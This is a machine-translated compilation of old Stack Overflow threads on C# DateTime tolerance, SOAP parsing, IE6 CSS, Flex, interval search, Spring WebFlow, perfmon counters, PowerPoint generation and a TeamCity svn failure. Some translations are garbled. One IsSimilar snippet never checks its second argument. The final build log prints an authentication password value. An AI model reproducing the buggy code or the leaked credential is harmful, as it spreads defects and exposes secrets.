        DateTime = dateTime;
        Tolerance = tolerance;
    }

    public TimeSpan Tolerance { get; private set; }
    public DateTime DateTime { get; private set; }

    public static bool operator ==(DateTime lhs, DateTimeWithin rhs)
    {
        return (lhs - rhs.DateTime).Duration() <= rhs.Tolerance;
    }

    public static bool operator !=(DateTime lhs, DateTimeWithin rhs)
    {
        return (lhs - rhs.DateTime).Duration() > rhs.Tolerance;
    }

    public static bool operator ==(DateTimeWithin lhs, DateTime rhs)
    {
        return rhs == lhs;
    }

    public static bool operator !=(DateTimeWithin lhs, DateTime rhs)
    {
        return rhs != lhs;
    }

    // Overloads that can deal with Nullable dates
    public static bool operator !=(DateTimeWithin lhs, DateTime? rhs)
    {
        return rhs != lhs;
    }

    public static bool operator ==(DateTime? lhs, DateTimeWithin rhs)
    {
        if (!lhs.HasValue && rhs.DateTime == default(DateTime)) return true;
        if (!lhs.HasValue) return false;
        return (lhs.Value - rhs.DateTime).Duration() <= rhs.Tolerance;
    }

    public static bool operator !=(DateTime? lhs, DateTimeWithin rhs)
    {
        if (!lhs.HasValue && rhs.DateTime == default(DateTime)) return true;
        if (!lhs.HasValue) return false;
        return (lhs.Value - rhs.DateTime).Duration() > rhs.Tolerance;
    }

    public static bool operator ==(DateTimeWithin lhs, DateTime? rhs)
    {
        return rhs == lhs;
    }
} 
```

并进行快速单元测试以验证一切正常：

```
[TestMethod]
public void DateTimeExtensions_Within_WorksWithNullable()
{
    var now = DateTime.Now;
    var dtNow1 = new DateTime?(now);
    var dtNow2 = new DateTime?(now.AddMilliseconds(1));
    var dtNowish = new DateTime?(now.AddMilliseconds(25));
    DateTime? dtNull = null;

    Assert.IsTrue(now == dtNow1.Within()); // Compare DateTime to DateTime?
    Assert.IsTrue(dtNow1 == dtNow2.Within()); // Compare two DateTime? using a different syntax
    Assert.IsTrue(dtNow1 == dtNow2.Within()); // Same value should be true
    Assert.IsFalse(dtNow1 == dtNowish.Within()); // Outside of the default 10ms tolerance, should not be equal
    Assert.IsTrue(dtNow1 == dtNowish.Within(TimeSpan.FromMilliseconds(50))); // ... but we can override this
    Assert.IsFalse(dtNow1 == dtNull.Within()); // Comparing a value to null should be false
    Assert.IsTrue(dtNull == dtNull.Within()); // ... but two nulls should be true
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T16:41:52.780

> 默认情况下，C# 将 DateTime 对象与毫秒进行比较。

实际上分辨率是 100ns 滴答声。

如果您要比较数据库中的两个 DateTime 值，它们的分辨率为 1 秒，没问题。

如果您要与来自另一个来源的 DateTime（例如，使用 DateTime.Now 的当前 DateTime）进行比较，那么您需要决定如何处理小数秒。例如，四舍五入到最接近或截断？如果恰好是半秒，如何舍入。

我建议你四舍五入或截断到整数秒，然后与数据库中的值进行比较。 [这是一篇描述如何对 DateTime 进行四舍五入的帖子](https://stackoverflow.com/questions/166145/whats-the-best-way-to-round-a-net-date-object-to-the-nearest-minute#166272)（此示例四舍五入到分钟，但主体是相同的）。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-04-09T04:29:13.683

我创建了扩展方法 IsSimilar

```
public static bool IsSimilar(this DateTime? lhs, DateTime? rhs, TimeSpan tolerance)
{
    if (!lhs.HasValue && !lhs.HasValue) return true;//both are null
    if (!lhs.HasValue || !lhs.HasValue) return false;//one of 2 is null
    return IsSimilar(lhs.Value, rhs.Value, tolerance);
}
public static bool IsSimilar(this DateTime lhs, DateTime rhs, TimeSpan tolerance)
{
    return (lhs - rhs).Duration() <= tolerance;
 } 
```

# c# - 处理 SOAP 响应时出现 XML 解析错误

> ID：381403
> 
> 赞同：2
> 
> 时间：2008-12-19T16:10:46.900
> 
> 标签：c#, vb.net, web-services

我正在使用 C# .Net 2.0 编写 Web 服务客户端。服务器的soap实现已经过测试并且非常可靠。gSoap/C++ 应用程序读取响应没有问题。但是，.Net 实现在调用其中一种方法时会抱怨“XML 文档中存在错误”。xml 解析器愉快地处理了从服务器收到的类似响应。

在我看来，MSXML 解析器（我希望那是.Net 一直在使用的）是一个非常无情的解析器。

我无法控制服务器。我必须如何解决这个问题。所以，我正在考虑写一个 SoapExtension 描述[here](https://stackoverflow.com/questions/256234/how-do-i-get-access-to-soap-response)

所以我的问题是，我可以在反序列化阶段之前挂钩解析器并完全绕过反序列化阶段。

最重要的是，我如何指示 SOAP 存根使用我的扩展类？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T16:39:36.153

首先，我会在反序列化阶段获取失败 XML 的快照，以尝试诊断问题。

您可以将您的肥皂扩展程序挂接到您的客户端应用程序中，而无需重新编译。只需添加：

```
<webServices>
    <soapExtensionTypes>
        <add type="DebugTools.SOAP.SOAPTrace.SoapTraceExtension, DebugTools.SOAP" 
               priority="0" group="High"/>
    </soapExtensionTypes>
</webServices> 
```

*DebugTools.SOAP.SOAPTrace*是 SoapTraceExtension 的命名空间
*DebugTools.SOAP*是包含肥皂跟踪代码的程序集的名称。

到您的 app.config 或 web.config 文件。

如果您可以使用堆栈跟踪粘贴完整的异常，那将很方便。可能有一些非常明显的东西。此外，如果可能的话，Web 服务的 WSDL 将**非常**有用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-17T00:38:26.047

如果您想逐步完成序列化/反序列化代码，可以使用名为 SGen 的工具。SDK自带VS，使用如下：

1.  使用普通的 VS 生成（或 wsdl.exe 生成）代理类编译应用程序（这些通常是隐藏的，位于名为 Reference.cs 的文件中

2.  拖放到 Visual Studio cmd 提示符，然后打开 Debug/Release 文件夹（即 exe 已编译到的文件夹）

3.  在 cmd 提示符下键入以下内容（将 TheApplicationName 替换为您的应用程序名称）： SGEN /keep TheApplicationName.exe

您现在将看到已创建许多文件。删除除 .cs 文件之外的所有生成文件（包括它创建的 dll）

将 .cs 文件移动到源文件夹，并将其包含在您的项目中。

将以下属性添加到您的 Reference.cs ：

```
[XmlSerializerAssembly()] 
```

您现在可以逐步通过实际的序列化和反序列化代码来查找实际问题（如果没有其他方法可以解决问题，您可以根据需要更改此生成的代码）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-17T01:06:03.530

顺便说一句，.NET 不使用 MSXML。它有自己的实现。如果 XmlReader 为每个**Read**调用调用 MSXML，性能将非常糟糕。

# html - 让 div 在 IE6 和 IE7/FF 中看起来一样

> ID：381405
> 
> 赞同：0
> 
> 时间：2008-12-19T16:10:52.310
> 
> 标签：html, css, internet-explorer-6

我有一个内部有五个浮动 div 的 div：

```
var div=document.createElement("div");
div.className="cssDivNino";

var divFolio=document.createElement("div");
divFolio.className="cssFolio";
div.appendChild(divFolio);

var divCurp=document.createElement("div");
divCurp.className="cssCurp";
div.appendChild(divCurp);

var divNombre=document.createElement("div");
divNombre.className="cssNombre";
div.appendChild(divNombre);

var divLocalidad=document.createElement("div");
divLocalidad.className="cssLocalidad";
div.appendChild(divLocalidad);

var divClear=document.createElement("div");
divClear.className="clear";
div.appendChild(divClear);

divFolio.innerHTML= someData;
divCurp.innerHTML= someData;
divNombre.innerHTML= someData;
divLocalidad.innerHTML= someData; 
```

这是CSS：

```
.cssDivNino {padding: 0; margin: 0}
.cssFolio {font-family:arial; font-size:10px; color:#000000; background-color:#FFFFFF; float: left; width: 7%; margin-right: 1%; padding: 0}
.cssCurp {font-family:arial; font-size:10px; color:#000000; background-color:#FFFFFF; float: left; width: 17%; margin-right: 1%; padding: 0}
.cssNombre {font-family:arial; font-size:10px; color:#000000; background-color:#FFFFFF; float: left; width: 36%; margin-right: 1%; padding: 0}
.cssLocalidad {font-family:arial; font-size:10px; color:#000000; background-color:#FFFFFF; float: left; width: 35%; margin-right: 1%; padding: 0}
.clear { clear:both; width: 0%; height: 0; padding: 0; margin: 0; border: thin; border-color:#000000} 
```

这就是它在[IE7 和 Firefox](http://prueba.edomexico.gob.mx/desarrolladores_c/benjamin/apadrinalo/divIE7FF.jpg)以及[IE6](http://prueba.edomexico.gob.mx/desarrolladores_c/benjamin/apadrinalo/divIE6.jpg)中的外观。请注意 IE6 上子 div 下的父 div 的额外空间。

我试图用javascript解决这个问题：

```
div.style.height = divFolio.style.height; 
```

但它不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T16:16:33.313

几点注意事项：

1.  `<table>`只需使用表格形式的数据， 您就可以省去很多麻烦。

2.  与让浏览器只渲染原始 HTML 相比，通过 DOM 构建这些东西要慢得多。只是需要注意的事情。

无论如何，我会立即尝试将容器 div`.cssDivNino`也向左浮动，明确地将顶部和底部边距设置为 0，并密切关注[IE6 的浮动/边距错误套件。](http://www.positioniseverything.net/explorer/floatIndent.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T16:22:31.680

我同意 Tpiptych，但为了争论，如果我想实现这一点，我最终会为缺陷浏览器使用不同的样式表（在本例中为 IE6）。

请注意，您可能无法获得 100% 的相同外观，您可能需要为 IE6 设计稍微不同的外观。

即使在我写完这篇文章之后，我仍然支持 <table> 解决方案。

！

问候，
弗兰克

# apache-flex - Flex：在 dataGrid cellEditor 中立即编辑

> ID：381408
> 
> 赞同：0
> 
> 时间：2008-12-19T16:12:20.873
> 
> 标签：apache-flex, datagrid, numericstepper

当我在 a 中编辑一个单元格时，在我完成编辑之前`dataGrid`，这些更改不会应用于。`dataProvider`有没有办法可以让更改出现在`dataProvider`编辑时？

我会假设这样做的方法是对我正在使用的编辑器进行子类化，在这种情况下`NumericStepper`，但我不知道该怎么做。

我需要触发某种事件吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-31T02:09:17.217

如果您创建自己的 itemEditor/itemRenderer，您可以执行以下操作：

```
<mx:TextInput xmlns:mx="..." change="onChange(event)"
    implements="mx.controls.listClasses.IDropInListItemRenderer">
    <mx:Script>
        <![CDATA[

        import mx.controls.dataGridClasses.DataGridListData;
        import mx.controls.listClasses.BaseListData;
        [Bindable("dataChange")] private var _listData : BaseListData;
        public function get listData():BaseListData
        {
            return _listData;            
        }                   
        public function set listData( value : BaseListData ) : void
        {
            _listData = value;
        }

        private function onChange(event:Event):void
        {
             this.data[ (listData as DataGridListData).dataField ] = this.text;
        }
        ]]>
    </mx:Script>
</mx:TextInput> 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-20T19:07:59.583

如果您需要引用 itemeditor 之外的任何内容，我所做的就是通过 outerDocument.somePublicVar。

因此，如果您需要引用正在编辑的数据网格的数据提供者，您可以更新绑定到数据网格的 var，但它必须是公共的（我认为），或者您可以直接编辑数据网格数据提供者。

在项目编辑器中，您可以捕获更改事件并从那里更新数据提供者中的值。但请记住，最终编辑项事件将被抛出，并且如果您在那里进行任何可能与您的数据提供者混淆的处理。

# algorithm - 测试特定数字属于哪个集的有效算法

> ID：381414
> 
> 赞同：5
> 
> 时间：2008-12-19T16:14:12.693
> 
> 标签：algorithm, data-structures

如果我有大量连续范围（例如 [0..5], [10..20], [7..13],[-1..37] ）并且可以将这些集合排列成任何数据结构我喜欢，测试**特定 test_number 属于*****哪个*****集合的最有效方法是什么？**

 *我考虑过基于集合的低数量将集合存储在平衡的二叉树中（并且每个节点都将拥有具有相同最低集合数量的所有集合）。这将允许您根据您针对集合测试的 test_number 是否小于集合的最小数量来有效地修剪集合的数量，然后修剪该节点以及该节点右侧的所有节点（在其范围内有一个小于 test_number) 的低数字。我认为这将平均修剪大约 25% 的集合，但是我需要线性查看二叉树中的所有其余节点以确定 test_number 是否属于这些集合。（我可以通过按集合中的最高数字对任何一个节点的集合列表进行排序来进一步优化，这将允许我在特定列表中进行二进制搜索以确定哪个集合（如果有）包含 test_number。不幸的是，我要处理的大多数集合都没有重叠的集合边界。）

我认为这个问题已经在图形处理中得到解决，因为他们已经找到了有效测试整个模型中哪些多边形对特定像素有贡献的方法，但我不知道这种算法的术语。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T16:30:40.570

您对问题与图形相关性的直觉是正确的。考虑构建和查询[段树](http://en.wikipedia.org/wiki/Segment_tree)。它特别适合您想要的计数查询。另见[计算几何中的描述](http://books.google.com/books?id=C8zaAWuOIOcC&pg=PA229&dq=isbn:3540656200#PPA223,M1)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T16:47:45.810

我认为构建树形结构将大大加快速度（前提是您有足够的集合和数字来检查它是否值得初始成本）。它应该是三叉树，而不是二叉树。每个节点都应该有左、中、右节点，其中左节点包含严格小于节点集合的集合，右节点严格大于节点集合，中间有重叠。

```
 Set1
              /  |  \
             /   |   \
            /    |    \
         Set2  Set3   Set4 
```

可以快速轻松地判断集合中是否存在重叠，因为您只需比较最小值和最大值即可对它们进行排序。在上面的简单情况下，Set2[max] < Set1[min]，Set4[min] > Set1[max]，并且 Set1 和 Set3 有一些重叠。这将加快您的搜索速度，因为如果您要搜索的号码在 Set1 中，则它不会在 Set2 或 Set4 中，您不必检查它们。

我只想指出，如果要检查的数字多于集合，则使用这样的方案只会节省检查每个集合的幼稚实现的时间。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-12-19T16:22:48.793

我想我会以与 Mediawiki 索引页面相同的方式来组织它们——作为[桶排序](http://en.wikipedia.org/wiki/Bucket_sort)。我不知道它是*那里*最有效的算法，但它应该很快，并且很容易实现（即使我已经管理过它，而且在 SQL 中！！）。

基本上，排序算法是

```
For Each SetOfNumbers
   For Each NumberInSet
      Put SetOfNumbers into Bin(NumberInSet) 
```

然后查询，你可以只统计 Bin(MyNumber) 中的项目数

当您的 SetOfNumbers 很少更改时，此方法将很有效，尽管如果它们定期更改，通常也不会太难保持 Bins 更新。它的主要缺点是它为了非常快速的查询而牺牲了空间和初始排序时间。

请注意，在算法中，我将 Ranges 扩展为 SetsOfNumbers - 枚举给定范围内的每个数字。

# javascript - Javascript 表单提交以激活带有 JSF 集成的 Spring Web Flow 转换

> ID：381434
> 
> 赞同：0
> 
> 时间：2008-12-19T16:20:05.973
> 
> 标签：javascript, jsf, facelets, spring-webflow

我正在使用 Spring WebFlow 2、Facelets 和 JSF 开发应用程序。我的一个流程确实有一个页面，该页面必须在某些事件中触发表单提交。对于每个不同的动作，必须呈现不同的视图。因此，我正在尝试激活以下 javascript 代码来执行提交：

```
function myFormSubmit( eventId ) {
   var formAction = document.myForm.action;
   document.myForm.action = formAction + '&_eventId=' + eventId;
   document.myForm.submit();
} 
```

不幸的是，这不会触发我的流程中请求的转换。页面没有变化。有谁知道如何处理这个？

谢谢， 亚历山大

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T16:26:47.817

对 SringFaceletsSF 一无所知，但我认为事件处理程序可能应该 return `true`。否则您的浏览器将不会提交表单。

所以：

```
function myFormSubmit( eventId ) {
   var formAction = document.myForm.action;
   document.myForm.action = formAction + '&_eventId=' + eventId;
   document.myForm.submit();
   return true;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T16:43:11.920

仔细观察，这段代码有很多问题。

document.myForm.action 是获取元素的非标准方式。更好的跨浏览器方式是：

```
document.getElementById('myFormId'); 
```

盲目地在表单操作 URL 后附加一个 & 符号假定已经有另一个 url 参数，因此 URL 后面已经有一个问号。如果不是这种情况，则以下换行：

```
document.myForm.action = formAction + '&_eventId=' + eventId; 
```

最后，*如果*您将此函数作为 onsubmit 处理程序调用，我相信您应该只返回 true，而不是调用该`myForm.submit()`方法

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-05T17:08:15.590

我在 Spring WebFlow 论坛中找到了解决方案。根据 Jeremy Grelle 的说法，在将 Spring WebFlow 集成到 JSF 时，提交“_eventId”参数不会触发转换。他给出的解决方案是创建一个 JSF PhaseListener，它在发送“_eventId”参数时创建一个 JSF 动作。

可以在[http://forum.springsource.org/showthread.php?p=219358#post219358](http://forum.springsource.org/showthread.php?p=219358#post219358)看到 phaseListener 代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T16:22:31.383

您是在 GET 参数还是 POST 参数中寻找此参数？***它不会出现在 POST 中。***

更新：

好的，为了说明，试试这个......

更改您的功能以执行此操作：

```
function myFormSubmit( eventId ) {
   var formAction = document.myForm.action;
   //document.myForm.action = formAction + '&_eventId=' + eventId;
     var myAction = document.createElement('input');
     myAction.setAttribute('name', '_eventId');
     myAction.setAttribute('type', 'hidden');
     myAction.setAttribute('value', eventId);
     document.myForm.appendChild(myAction);
   document.myForm.submit();
} 
```

在任何（非 IE）* 浏览器中进行测试，看看它是否有效。如果是这样，那么 GET 与 POST 参数就是问题所在。

```
* non-IE: trying to set the name or type in IE will FAIL, thus don't test there. 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-19T18:00:15.553

修改 form.action 是向表单提交添加信息的一种非常糟糕的方式。我建议在您的表单中放置一个隐藏的输入，您可以使用您的 eventID 填充该输入。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-12-17T22:58:37.563

Is there any reason you can't use the Spring Faces components which come with SWF? There's an ajaxEvent tag you can use to wrap elements. It activates on given javascript events (onclick, onchange) and invokes an action of your choice.

# asp.net - 性能监视器显示 4294967293 个会话处于活动状态

> ID：381443
> 
> 赞同：3
> 
> 时间：2008-12-19T16:24:21.037
> 
> 标签：asp.net, windows-server-2003, perfmon

我有一个在 Windows Server 2003 R2 上的 IIS 6 中运行的 ASP.Net 3.5 网站。它是一个相对较小的内部应用程序，在任何给定时间可能为少于十个用户提供服务。服务器有 4 Gig 的内存，并显示 3+ Gig 在站点处于活动状态时可用。

重新启动 Web 应用程序几分钟后，性能监视器显示有多达 4,294,967,293 个会话处于活动状态！我相当肯定这个数字是不正确的；在本次阅读时，该网站只有 100 个请求。

有没有其他人从 perf mon 经历过这种奇怪的行为？关于如何获得准确读数的任何想法？

更新：运行大约一个小时后，活动会话的数量减少了 4。所以它似乎确实在响应会话超时。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-19T16:29:53.583

嗯，2^32 = 4,294,967,296，所以听起来好像发生了某种溢出。不能确切地说为什么。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2008-12-19T18:09:51.183

可能是溢出，但我的钱在下溢。我认为该程序以 0 人开始，有人注销，然后会话数变为负数。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-06-23T22:16:59.723

我们有同样的问题。看起来 MS 有一个可用的修补程序：http: [//support.microsoft.com/kb/969722](http://support.microsoft.com/kb/969722)

2009 年 9 月 10 日更新：我们的 IT 部门联系了 MS 以获取修补程序。它解决了我们的问题。如果重要的话，我们正在运行 .NET 2.0。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-29T17:16:21.727

我也显示了一个很高的数字，目前是 4,294,967,268。

每次我放弃一个 Session，放弃的 Sessions 计数增加 1，而 Sessions Active 计数减少 1。目前我放弃的会话计数 = 16，所以这个数字可能从 4,294,967,84 开始。

有解决办法吗？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-09-01T12:10:52.003

我的计数器工作正常，但有一天早上我远程登录到生产服务器，计数器在这个巨大的数字上（正如有人提到的非常接近 2^32 表示下溢）。但与前一天一切正常的唯一区别是，在夜间，Windows 安装了更新。因此，出于某种原因，这些更新导致了这个非常烦人的错误。

再观察一下计数器，我发现每当应用程序重新启动时——在没有流量的一段时间后，计数器就会正确地从零开始。当用户开始登录时，它会增加。当他们再次开始注销时，它仍然会逐渐减少，直到达到应该为零的值。到那时，它就变成了香蕉……

叹...

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-03-25T10:11:14.913

如果您必须使用现有的统计数据，我在 Excel 中打开了日志文件并使用了一个公式来带来更准确的值。我不能保证它的准确性，但结果看起来还不错：

如果 B2 是 (aspnet_wp)\Sessions Active value ，并且公式位于 C2

```
/* This one is quicker as it doesn't have to do the extra calculations */
=IF(B2>1073741824,4294967296-B2,B2) 
```

或者

```
/* This one is clearer what is going on */
=IF(B2>power(2,30),(4*power(2,30))-B2,B2) 
```

PS（我感到你的痛苦——我必须解释为什么他们有 42 亿个会话打开，而一秒钟前他们只有 0 个！）

# asp.net - asp.net - 即时生成 Powerpoint 文件

> ID：381445
> 
> 赞同：11
> 
> 时间：2008-12-19T16:24:51.300
> 
> 标签：asp.net, reporting, report, powerpoint

我有一个基于 Web 的应用程序的客户端，他大量使用我们系统中的数据进行 PowerPoint 演示。

我们目前允许以更传统的文件类型导出数据...PDF、CSV、HTML 和其他一些文件类型。Powerpoint 似乎并不是真正自动化的。

有没有办法在 ASP.NET 服务器端自动创建和按需下载系统报告的 powerpoint 文件格式？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-19T16:36:51.463

MSDN 上有一些关于他们使用的 OpenXML 格式的文档：

*   [使用 Open XML 格式 API 处理 Excel 2007 和 PowerPoint 2007 文件（第 1 部分，共 2 部分）](http://msdn.microsoft.com/en-us/library/bb739834.aspx)
*   [使用 Open XML 格式 API 处理 Excel 2007 和 PowerPoint 2007 文件（第 2 部分，共 2 部分）](http://msdn.microsoft.com/en-us/library/bb727373.aspx)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T16:29:34.613

在[本文中](http://steveorr.net/reviews/AsposePowerPoint.aspx)，Steve 建议使用 Aspose 的 Slide 应用程序。

他还逐步解释了如何生成 PowerPoint 文件。

以下是一些代码摘录（在 VB 中）：

*打开现有的 PowerPoint 文件：*

```
 Dim fs As  System.IO.FileStream = _

   New System.IO.FileStream("c:\mypath\myfile.ppt", _

   System.IO.FileMode.Open, System.IO.FileAccess.Read)

Dim MyPres As Presentation = New Presentation(fs)

fs.Close() 
```

*循环幻灯片并输出其模板格式：*

```
Dim slides  As Slides = MyPres.Slides

For i As Integer = 0 To slides.Count - 1

   Response.Write(MyPres.Slides(i).Layout.ToString + "<br>")

Next 
```

在他的文章中，他更详细地描述了如何做到这一点。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-19T16:29:34.613

好吧，您有两种方法可以真正做到这一点，而无需第三方工具。第一个是 PowerPoint 自动化，但这需要您的服务器安装 PowerPoint。二是利用新的pptx文件文件格式，使用XML生成PowerPoint文档。

我发现开始使用 XML 方面的最佳方法是简单地创建一个你想要的 powerpoint，然后保存它并查看 XML。您还可以查看 microsoft 文档。总体而言，使用 XML 格式非常容易。

最后，可能会有一些第三方项目，但请注意它们不需要 COM 自动化。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-07-29T22:29:00.833

关于上一张海报，你的说法是不正确的。

对于此过程的服务器端 ASP.NET 自动化，您实际上只有一个选项。使用 Ben 在原始答案中提到的开放 xml 链接...

使用 Open XML 格式 API 处理 Excel 2007 和 PowerPoint 2007 文件（第 1 部分，共 2 部分） 使用 Open XML 格式 API 处理 Excel 2007 和 PowerPoint 2007 文件（第 2 部分，共 2 部分）

原因是办公室的服务器端自动化完全不受支持，并且是糟糕的编码实践，运行为在非交互式环境中交互式使用而设计的 com 自动化服务器可能会导致灾难。

所以总而言之，使用 open xml api 并生成您的 pptx。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-01-20T14:37:42.223

还有其他类似于 Aspose Slides 的第三方选项，例如 OfficeWriter 的[PowerPoint Writer](http://www.officewriter.com/powerpointwriter-features)。

我不确定 Aspose Slides 是如何工作的，但是使用 PowerPoint Writer，您有一个现有的、格式化的 PowerPoint 演示文稿，其中包含数据标记，您可以使用 PowerPoint Writer 处理它以用数据替换数据标记。下面是一些[例子](http://wiki.softartisans.com/display/PPTW8/PowerPointWriter+Overview)。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2011-03-26T05:31:42.003

还有另一种方法，将您的 power point 演示文稿转换为图像或 xps（银光演示文稿），然后使用某种 json（jquery）来显示和下载它们。

我在我的网络应用程序中实现图像和 xps 银光演示

# wpf - 系统托盘上下文菜单 - 为什么我的命令未启用？

> ID：381451
> 
> 赞同：1
> 
> 时间：2008-12-19T16:28:33.803
> 
> 标签：wpf, contextmenu, command, systray

我正在创建一个 WPF 应用程序，并有一个带有上下文菜单的系统托盘图标。对于我想使用 WPF 命令的菜单项，但是当我分配它们时，即使在其他地方启用了（相同的）命令，它们也总是灰色的。

```
MenuItem menuItem = new MenuItem();
menuItem.Header = "Exit";
menuItem.Command = CustomCommands.ExitApplication;
Systray.AddMenuItem(menuItem); 
```

当我分配单击事件并且我尝试为始终将 CanExecute 设置为 true 的命令创建 CanExecute 方法时，它工作正常，但这也无济于事。任何人都知道为什么菜单项被禁用？

* * *

更新：按照建议，我在上下文菜单中添加了一个命令绑定。这样做的效果是，它只有在您单击菜单后才能起作用，即，起初菜单项是灰色的，但是一旦您单击菜单上的某个位置，选项就会启用。

为了解决这个问题，在将菜单项添加到上下文菜单后，我调用了以下方法：

```
CommandManager.InvalidateRequerySuggested(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T17:23:45.130

在我的脑海中，我猜您必须将 CommandBinding 添加到菜单或系统托盘中，以便处理您的命令。尽管我认为如果是这种情况，它将默认启用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T22:36:09.087

是的，我已经看到了这种情况。有时您必须告诉 WPF CommandManager 系统重新运行 CanExecute 方法。加载 ContextMenu 后尝试调用它：`CommandManager.InvalidateQuerySuggested();`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-09T19:24:21.320

我有一个类似的问题。我觉得我的解决方案有点破解，但我真的无法解决这个问题。我正在使用自定义 DelegateCommand 实现，并且除上下文菜单中的项目外，取消/禁用按钮和菜单项都有效。所以，我所做的是处理 ContextMenuOpening 事件，然后将项目存储在临时变量中，调用 ContextMenu 中的 Clear 方法并立即重新添加项目。像魅力一样工作，但就像我说的那样，感觉“hacky”。它是这样的：

```
 private void ContextMenu_ContextMenuOpening (object sender, System.ComponentModel.CancelEventArgs e)
    {
        // HACK: For some reason items need to be removed and added back so that the command enablement requery works.
        var menu = sender as ContextMenu;
        if (menu == null) return;

        var menuItems = menu.Items.ToArray();
        menu.Items.Clear();
        foreach (var menuItem in menuItems)
            menu.Items.Add(menuItem);
    } 
```

# svn - 为什么 TeamCity 不运行我的 Nant 构建文件？

> ID：381452
> 
> 赞同：1
> 
> 时间：2008-12-19T16:28:38.530
> 
> 标签：svn, nant, teamcity

我有一个简单的 NAnt 构建文件，它尝试从指定目录的 subversion 执行更新。测试构建文件内容的示例是：

```
<?xml version="1.0" ?>
<project name="Project_name" default="update">
<property name="root" value="C:\Subversion\UpdateDir" overwrite="false"/>
<property name="build.repos" value="http:/server/svnrepos" overwrite="false"/>
<property name="build.user" value="user" overwrite="false"/>
<property name="build.pwd" value="userpw" overwrite="false"/>
    <target name="update">
        <!-- Update all files to latest (head) revision from the repository -->
        <svn-update destination="${root}" uri="${build.repos}" username="${build.user}" password="${build.pwd}" commandline="-r HEAD -q --no-auth-cache"/>
    </target>
</project> 
```

当构建在 TeamCity（已配置为执行测试构建文件）中运行时，构建失败并从 Collabnet subversion 客户端“svn.exe”文件返回错误 1。

烦人的是，NAnt GUI 可以无错误地运行构建文件，所以我不明白 TeamCity 为什么会失败，因为我相信它使用与 NAnt GUI 相同的颠覆客户端和相同的 MS .net 框架版本.

错误日志详细信息如下，该错误与 NAnt Contrib 任务 'svn-update' 相关：

```
[16:01:56]: svn-update
[16:01:56]: [svn-update] svn: Working copy '.' locked
[16:01:56]: [svn-update] svn: run 'svn cleanup' to remove locks (type 'svn help cleanup' for details)
[16:01:56]: C:\Subversion\ProjectBuilds\BuildFiles\Update0412.build(9,10): External Program Failed: C:\Program Files\CollabNet Subversion\svn.exe (return code was 1)
[16:01:56]: NAnt output: "C:\Program Files\NAnt-Gui\bin\NAnt.exe" -buildfile:C:\Subversion\ProjectBuilds\BuildFiles\Update0412.build -extension:C:\BuildAgent\plugins\dotnetPlugin\bin\JetBrains.BuildServer.NAntLoggers.dll -listener:JetBrains.BuildServer.NAntLoggers.NAntListener -D:teamcity.buildConfName=0412 -D:DotNetFramework1.1_Path=C:\WINDOWS\Microsoft.NET\Framework\v1.1.4322 -D:agent.home.dir=C:\BuildAgent "-D:agent.name=TeamCity Build Agent" -D:build.number=0.0.33 -D:teamcity.dotnet.nunitlauncher2.0=C:\BuildAgent\plugins\dotnetPlugin\bin\JetBrains.BuildServer.NUnitLauncher2.0.exe -D:teamcity.dotnet.platform=C:\BuildAgent\plugins\dotnetPlugin\bin\JetBrains.TeamCity.PlatformProcessRunner.1.1.exe -D:DotNetFramework1.1= -D:build.number.format=0.0.{0} -D:user.language=en -D:user.country=GB -D:os.version=5.1 -D:user.timezone=Europe/London -D:file.encoding=Cp1252 -D:file.separator=\ -D:agent.work.dir=C:\BuildAgent\work "-D:teamcity.projectName=Project 0412" -D:teamcity.dotnet.nunitlauncher2.0.vsts=C:\BuildAgent\plugins\dotnetPlugin\bin\JetBrains.BuildServer.NUnitLauncher2.0.VSTS.exe -D:os.arch=x86 -D:DotNetFramework1.1_x86_Path=C:\WINDOWS\Microsoft.NET\Framework\v1.1.4322 -D:DotNetFramework1.1_x86= -D:teamcity.build.tempDir=C:\BuildAgent\temp\buildTmp -D:teamcity.dotnet.coveragelauncher=C:\BuildAgent\plugins\dotnetPlugin\bin\TeamCityRunners\JetBrains.dotTrace.TeamCity.CoverageRunner.exe -D:build.vcs.number=5758 -D:teamcity.dotnet.nunitlauncher=C:\BuildAgent\plugins\dotnetPlugin\bin\JetBrains.BuildServer.NUnitLauncher.exe -D:build.vcs.number.1=5758 -D:user.name=SYSTEM "-D:os.name=Windows XP" -D:build.vcs.number.0412=5758 "-D:teamcity.version=4.0 (build 8080)" -D:teamcity.dotnet.nunitaddin=C:\BuildAgent\plugins\dotnetPlugin\bin\JetBrains.TeamCity.NUnitAddin-NUnit -D:teamcity.auth.password=YVscypn9BG9okr0ojOES7LgevrD8Wpfp 